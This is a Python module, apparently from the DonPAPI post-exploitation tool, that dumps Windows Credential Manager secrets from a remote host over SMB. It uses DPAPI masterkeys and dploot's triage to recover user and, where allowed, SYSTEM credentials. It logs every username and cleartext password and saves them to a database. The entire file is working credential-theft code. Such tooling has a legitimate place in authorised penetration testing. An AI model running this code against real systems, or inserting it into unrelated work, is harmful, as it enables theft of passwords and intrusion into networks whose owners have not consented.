from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.credentials import CredentialsTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter

TAG = "CredMan"

class CredentialManagerDump:

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Credential Manager")
        credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        credentials = credentials_triage.triage_credentials()
        for credential in credentials:
            self.logger.secret(f"[{credential.winuser}] {credential.target} - {credential.username}:{credential.password}", TAG)
            self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user=credential.winuser, username=credential.username.rstrip("\x00"), password=credential.password.rstrip("\x00"), target=credential.target.rstrip("\x00"))
        if self.context.remoteops_allowed:
            system_credentials = credentials_triage.triage_system_credentials()
            for credential in system_credentials:
                self.logger.secret(f"[SYSTEM] {credential.target} - {credential.username}:{credential.password}", TAG)
                self.context.db.add_secret(computer=self.context.host, collector=TAG, windows_user="SYSTEM", username=credential.username.rstrip("\x00"), password=credential.password.rstrip("\x00"), target=credential.target.rstrip("\x00"))